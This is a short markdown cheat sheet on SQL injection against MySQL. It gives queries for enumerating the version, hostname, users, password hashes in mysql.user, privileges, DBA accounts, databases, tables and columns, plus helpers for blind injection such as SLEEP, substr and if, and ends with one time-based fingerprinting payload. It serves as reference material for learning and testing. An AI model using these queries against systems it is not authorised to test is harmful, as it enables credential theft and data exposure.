# SQL injection
SQL injection (SQLi) is an application security weakness that allows attackers to control an application’s database – letting them access or delete data, change an application’s data-driven behavior, and do other undesirable things – by tricking the application into sending unexpected SQL commands. 

SQL injection weaknesses occur when an application uses untrusted data, such as data entered into web form fields, as part of a database query. When an application fails to properly sanitize this untrusted data before adding it to a SQL query, an attacker can include their own SQL commands which the database will execute. Such SQLi vulnerabilities are easy to prevent, yet SQLi remains a leading web application risk, and many organizations remain vulnerable to potentially damaging data breaches resulting from SQL injection.

### Commands that can be used to run sql injection

<table border="1">
<tbody>
<tr>

<td>Version</td>
<td>


```sql
SELECT @@version
```

</td>
</tr>



<tr>
<td>Location of DB files</td>
<td>

```sql
SELECT @@datadir;
```

</td>
</tr>


</tr>

<tr>
<td>Hostname, IP Address</td>
<td>

```sql
SELECT @@hostname;
```

</td>
</tr>

<tr>
<td>Create Users</td>
<td>

```sql
CREATE USER test1 IDENTIFIED BY 'pass1'; 
```

</td>
</tr>
<tr>
<td>Delete Users</td>
<td>

```sql
DROP USER test1; 
```

</td>
</tr>

<tr>
<td>Current User</td>
<td>


```sql
SELECT user();
SELECT system_user();
```

</td>
</tr>
<tr>
<td>List Users</td>
<td>

```sql
SELECT user FROM mysql.user;
```

</td>
</tr>
<tr>
<td>List Host info</td>
<td>

```sql
SELECT host, user, authentication_string FROM mysql.user;

```
</td>
</tr>
<tr>
<td>List Privileges</td>
<td>

```sql
SELECT grantee, privilege_type, is_grantable 
FROM information_schema.user_privileges; -- list user privs


SELECT host, user, Select_priv, Insert_priv, 
Update_priv, Delete_priv, Create_priv, Drop_priv, 
Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, 
References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, 
Create_tmp_table_priv, Lock_tables_priv, 
Execute_priv, Repl_slave_priv, Repl_client_priv 
FROM mysql.user;

 
SELECT grantee, table_schema, privilege_type 
FROM information_schema.schema_privileges;


SELECT table_schema, table_name, column_name, privilege_type 
FROM information_schema.column_privileges; -- list privs on columns
```

</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>

```sql
SELECT grantee, privilege_type, is_grantable 
FROM information_schema.user_privileges 
WHERE privilege_type = 'SUPER';

SELECT host, user 
FROM mysql.user WHERE Super_priv = 'Y'; 
```

</td>
</tr>
<tr>
<td>Current Database</td>
<td>

```sql
SELECT database()
```

</td>
</tr>
<tr>
<td>List Databases</td>
<td>

```sql
/*option 1*/
SELECT schema_name FROM information_schema.schemata;

/*option 2*/
SELECT DISTINCT TABLE_SCHEMA
FROM information_schema.columns; 
```

</td>

<tr>
<td>List Tables</td>
<td>

```sql
/* 
Get all table names that are in 'mysql' db
*/
SELECT DISTINCT TABLE_NAME
FROM information_schema.columns 
WHERE TABLE_SCHEMA='mysql';
```

</td>
</tr>

</tr>
<tr>
<td>List Columns</td>
<td>

```sql

/* 
Get all column names of 'servers' table, that is in 'mysql' db
*/
SELECT COLUMN_NAME, DATA_TYPE, COLUMN_TYPE, COLUMN_DEFAULT, IS_NULLABLE, COLUMN_KEY
FROM information_schema.columns 
WHERE TABLE_SCHEMA = 'mysql' AND TABLE_NAME='servers';
```

</td>
</tr>

<tr>
<td>Find Tables From Column Name</td>
<td>

```sql
/*
find table which have a column called ‘username’
*/
SELECT TABLE_SCHEMA, TABLE_NAME 
FROM information_schema.columns 
WHERE COLUMN_NAME = 'username'; 
```

</td>
</tr>


<tr>
<td>ASCII Value to Char</td>
<td>


```sql
SELECT char(65); # returns A
```

</td>
</tr>
<tr>
<td>Char to ASCII Value</td>
<td>

```sql
SELECT ascii('A'); # returns 65
```

</td>
</tr>
<tr>
<td>Casting</td>
<td>

```sql
SELECT cast('1' AS unsigned integer);
SELECT cast('123' AS char);
```

</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>


```sql
SELECT CONCAT('A','B'); #returns AB
SELECT CONCAT('A','B','C'); # returns ABC
SELECT CONCAT('A',char(cast('39' AS unsigned integer))); # returns A'
```

</td>
</tr>

<tr>
<td>Select Nth Char</td>
<td>

```sql
SELECT substr('abcd', 3, 1); # returns c
```

</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>

```sql
SELECT 6 & 2; # returns 2
SELECT 6 & 1; # returns 0
```

</td>
</tr>

<tr>
<td>If Statement</td>
<td>

```sql
SELECT if(1=1,'foo','bar'); # returns ‘foo’
```

</td>
</tr>
<tr>
<td>Case Statement</td>
<td>

```sql
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END; # returns A
```
</td>
</tr>

<tr>
<td>Time Delay</td>
<td>

```sql
SELECT SLEEP(5);
```

</td>
</tr>

<tr>
<td>Comments</td>
<td>


```sql
SELECT 1; #comment
SELECT /*comment*/1;
```

</td>


</tr>

</tbody>
</table>


### Sql injection examples
```sql
SELECT if(@@version LIKE '%ubuntu0.18.04.4%',SLEEP(5),'non_ubuntu');
```
